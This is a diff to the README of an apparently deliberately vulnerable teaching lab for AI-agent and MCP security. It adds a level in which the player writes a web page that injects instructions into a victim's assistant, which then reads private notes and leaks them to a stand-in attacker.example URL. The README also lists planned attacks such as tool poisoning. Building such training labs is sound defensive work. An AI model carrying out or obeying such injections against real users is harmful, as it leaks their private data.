@@ -21,6 +21,7 @@ export ANTHROPIC_API_KEY=sk-ant-...
 uv run dvmcp list          # see levels and progress
 uv run dvmcp play 1        # chat with level 1's agent
 uv run dvmcp submit 1 'DVMCP{...}'
+uv run dvmcp play 2        # attack a victim's agent through a web page you control
 ```
 
 Or with Docker:
@@ -28,6 +29,9 @@ Or with Docker:
 ```bash
 docker build -t dvmcp .
 docker run -it --rm -e ANTHROPIC_API_KEY dvmcp play 1
+
+# Level 2 needs a folder you can edit from the host (your attacker website):
+docker run -it --rm -e ANTHROPIC_API_KEY -e DVMCP_HOME=/lab -v "$HOME/.dvmcp:/lab" dvmcp play 2
 ```
 
 The agent uses `claude-opus-5-5` by default. Set `DVMCP_MODEL` to try another model
@@ -45,10 +49,21 @@ hold up against the same attack is half the fun.
 | # | Name | Attack class |
 |---|------|--------------|
 | 1 | The Trusting Helpdesk | Authorization delegated to the LLM |
-| 2+ | coming soon | indirect prompt injection, tool poisoning, secret exfiltration, rug-pull tools... |
+| 2 | The Poisoned Page | Indirect prompt injection and data exfiltration (the "lethal trifecta") |
+| 3+ | coming soon | tool poisoning, rug-pull tool updates, confused deputy, token passthrough... |
 
-For the fixed version of Level 1, with OAuth token verification and server-side authorization,
-see [`src/dvmcp/secure/README.md`](src/dvmcp/secure/README.md).
+**Level 2 is different:** you don't chat with the agent. A simulated victim asks her assistant to
+review a web page, and you write that page. Files you put in `~/.dvmcp/level02/site/` are served at
+`http://attacker.example/`, and every request the assistant makes to your site lands in
+`~/.dvmcp/level02/access.log`. You can't see the victim's conversation, only which tools ran and
+your own server's log, so the only way to win is real exfiltration. The whole "internet" is
+simulated and offline. Nothing reaches the real network.
+
+Fixed versions:
+- Level 1, with OAuth token verification and server-side authorization:
+  [`src/dvmcp/secure/README.md`](src/dvmcp/secure/README.md).
+- Level 2, with secret isolation, taint-based egress control and untrusted-content labeling:
+  `src/dvmcp/levels/level02_secure_research.py` (spoilers, read the write-up first).
 
 ## How it works
 
@@ -58,6 +73,15 @@ you  ──chat──▶  agent (Claude)  ──MCP tool calls──▶  level's
 
 `dvmcp play N` starts level N's MCP server as a subprocess, connects a small agent loop to it
 (`src/dvmcp/agent.py`), and prints every tool call the agent makes so you can see what it's doing.
+
+In victim levels (Level 2) the loop is:
+
+```
+you ──edit──▶ your page on attacker.example
+victim ──"review this page"──▶ agent ──fetch_url──▶ your page (injection)
+                                agent ──read_note──▶ private data
+                                agent ──fetch_url──▶ attacker.example/?data=...  ──▶ your access log
+```
 
 ## Development
 
@@ -70,9 +94,10 @@ Tests run without an API key: they call the MCP servers directly and use a fake 
 ## Limitations & scope
 - **Educational only.** This is a deliberately vulnerable teaching lab. **Do not deploy it in
   production or expose it to untrusted networks** — the vulnerable levels are insecure by design.
-- **Implemented levels:** **Level 1 — The Trusting Helpdesk** is implemented, with a hardened
-  `secure/` reference. Further attack classes (indirect prompt injection, tool poisoning, secret
-  exfiltration, rug-pull tools) are **planned but not yet implemented**.
+- **Implemented levels:** **Level 1, The Trusting Helpdesk** (with a hardened `secure/` reference)
+  and **Level 2, The Poisoned Page** (with a secure reference server). Further attack classes
+  (tool poisoning, rug-pull tools, confused deputy, token passthrough) are **planned but not yet
+  implemented**.
 - **Requires an Anthropic API key** to play levels, and API usage **costs money**. Tests do not.
 - **Not a scanner or benchmark.** It teaches AI-agent/MCP attack and defense patterns by example;
   it does not assess or score real systems.
